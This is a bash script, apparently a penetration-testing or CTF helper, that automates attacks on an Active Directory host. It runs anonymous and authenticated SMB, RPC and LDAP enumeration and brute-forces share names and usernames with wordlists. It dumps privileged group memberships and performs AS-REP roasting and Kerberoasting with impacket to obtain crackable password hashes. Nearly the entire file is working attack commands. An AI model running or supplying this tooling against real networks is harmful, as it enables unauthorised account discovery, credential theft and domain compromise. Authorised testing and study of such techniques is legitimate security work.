#!/bin/bash
# Check if the target IP is provided as an argument
if [ -z "$1" ]; then
    echo "Usage: $0 <target_ip>  [-a [anon enumeration]] [-u=<username>] [-p=<password>] [-d=<domain>] [-r=<file to use for asprep/kerberoasting>] [-b] [-v] "
    exit 1
fi
# Function to display verbose messages
verbose_message() {
    if [ "$VERBOSE" == "true" ]; then
        echo -e "\e[47;30mVERBOSE: \e[0m $1"
    else
        echo "no hotdog"
    fi
}
# Extract the target IP from the arguments
TARGET_IP="$1"
shift  # Shift the target IP out of the positional parameters
#OPTIONAL PARAMETERS
username=""
password=""
domain=""
bruteForceShares=false
VERBOSE=false
#asrep-roasting & kerberoasting
roasting=""
anonLoginEnum=false

while getopts "au:p:d:r:bv" opt; do
  case $opt in
    a) anonLoginEnum=true;;
    u) username=$OPTARG;;
    p) password=$OPTARG;;
    d) domain=$OPTARG;;
    b) bruteForceShares=true;;
    r) roasting=$OPTARG;;
    v) VERBOSE=true;;
    \?) echo "Invalid option: -$OPTARG" >&2
        exit 1;;
  esac
done
# Shift the processed options out of the positional parameters
#shift $((OPTIND - 1))

echo "VERBOSE is set to: $VERBOSE"
echo "bruteForceShares is set to: $bruteForceShares"
echo "username is set to: $username"
echo "IP address:" $TARGET_IP
echo "ROasting:" $roasting
echo "anonymouse login enumeration:" $anonLoginEnum
# Display script header
verbose_message "Script started."
domainName=$(echo $domain | cut -d'.' -f1)
tld=$(echo $domain | cut -d'.' -f2)
WORDLIST="/usr/share/wordlists/rockyou.txt"
METASPLOIT_USERS="/usr/share/metasploit-framework/data/wordlists/unix_users.txt"
verbose_message "Creating directories."
mkdir -p nbtscan enum4linux smbclient rpcclient ldapsearch

if [ "$anonLoginEnum" == "true" ]; then
# This usually abuses anon login
    verbose_message "Running nbtscan and enum4linux."
    nbtscan -r "$TARGET_IP" > nbtscan/clientNcomputer
    enum4linux -a "$TARGET_IP" -u $username -p $password > enum4linux/index
    smbclient -L //$TARGET_IP -N > smbclient/shareAnon
fi
#enum4linux -a "$TARGET_IP" -u $username -p $password | grep -i "User" > enum4linux/enumUser
#BRUTE FORCE HERE
if [ "$bruteForceShares" == "true" ]; then
    verbose_message "Running smbclient & enum4linux"
    verbose_message "Dicitionary attack shares using enum4linux"
    enum4linux -s "$WORDLIST" "$TARGET_IP" -u $username -p $password > enum4linux/Shares
    if [ -z "$username" ] || [ -z "$password" ]; then
        smbclient -L "//${TARGET_IP}" -N >> smbclient/sharex
    else
        smbclient -L "//${TARGET_IP}" -U $username --password $password -N >> smbclient/sharex
    fi
    verbose_message "Dicitionary attack usernames using rpcclient"
    while IFS= read -r u; do
        verbose_message "$u"
        if [ -z "$username" ] || [ -z "$password" ]; then
            rpcclient -U "" "$TARGET_IP" -N --command="lookupnames $u"
        else
            rpcclient -U $username --password $password "$TARGET_IP"  --command="lookupnames $u"
        fi
    done < "$METASPLOIT_USERS" | grep "User: 1$" >> rpcclient/foundUserRPCclient.txt
fi
#END BRUTE FORCE SHARE
if [ -n "$domain" ] && [ -n "$username" ] && [ -n "$password" ]; then
    verbose_message "Running ldapsearch\(credential given\)"
    ldapsearch -x -H ldap://${TARGET_IP} -D ${username} -w ${password} -b "CN=Administrators,CN=Builtin,DC=$domainName,DC=$tld" > ldapsearch/Administrator
    ldapsearch -x -H ldap://${TARGET_IP} -D ${username} -w ${password} -b "CN=Users,DC=$domainName,DC=$tld" > ldapsearch/Users
    ldapsearch -x -H ldap://${TARGET_IP} -D ${username} -w ${password} -b "CN=Domain Admins,CN=Users,DC=$domainName,DC=$tld" > ldapsearch/DomainAdmins
    ldapsearch -x -H ldap://${TARGET_IP} -D ${username} -w ${password} -b "CN=Domain Users,CN=Users,DC=$domainName,DC=$tld" > ldapsearch/DomainUsers
    ldapsearch -x -H ldap://${TARGET_IP} -D ${username} -w ${password} -b "CN=Enterprise Admins,CN=Users,DC=$domainName,DC=$tld" > ldapsearch/EnterpriseAdmins
    ldapsearch -x -H ldap://${TARGET_IP} -D ${username} -w ${password} -b "CN=Remote Desktop Users,CN=Builtin,DC=$domainName,DC=$tld" > ldapsearch/RemoteUser
    ldapsearch -x -H ldap://${TARGET_IP} -D ${username} -w ${password} -b "CN=Account Operators,CN=Builtin,DC=$domainName,DC=$tld" > ldapsearch/AccountOPT
    ldapsearch -x -H ldap://${TARGET_IP} -b "DC=$domainName,DC=$tld" "(objectclass=organizationalUnit)" dn | grep "dn" ldapsearch/OU
else
    if [ "$anonLoginEnum" == "true" ]; then
        verbose_message "Running ldapsearch\(anon bind\)"
        verbose_message "checking anonymous bind..."
        ldapsearch -x -H ldap://${TARGET_IP} -D ${username} -w ${password} > ldapsearch/index
        if grep -q "bind must be completed" ldapsearch/index; then
            echo "anonymous bind is ok"
        else
            verbose_message "anonymous bind is not present"
        fi
    fi
fi
if [ -n "$roasting" ] && [ -n "$domain" ]; then
    verbose_message "asreproast & kerberoasting users in ${roasting}"
    while IFS= read -r u; do
        verbose_message "$u"
        #asreproasting & Kerberoasting
        #GetNPUsers.py can be used to retrieve domain users who do not have "Do not require Kerberos preauthentication" set and ask for their TGTs without knowing their passwords. 
        #It is then possible to attempt to crack the session key sent along the ticket to retrieve the user password. 
        #This attack is known as ASREProast.
        impacket-GetNPUsers ${domainName}/${u} -dc-ip ${TARGET_IP} -request -format hashcat -outputfile ${u}asreproast.hashes
        #get the SPNs on the domain; the given username is just for login thing(sometimes you don't need the password)
        impacket-GetUserSPNs -dc-ip ${TARGET_IP} ${domainName}/${u} -request-user ${u} -save
    done < "$roasting"
fi